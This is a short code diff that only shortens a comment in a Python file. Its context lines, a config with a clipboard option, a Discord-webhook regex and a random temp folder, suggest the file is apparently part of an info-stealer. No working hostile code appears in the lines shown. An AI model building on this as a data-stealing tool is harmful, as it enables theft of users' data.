@@ -46,7 +46,7 @@ __CONFIG__ = {
     "clipboard": False
 }
 
-#global variables
+#global
 temp = os.getenv("temp")
 regex = "https://discord.com/api/webhooks"
 temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
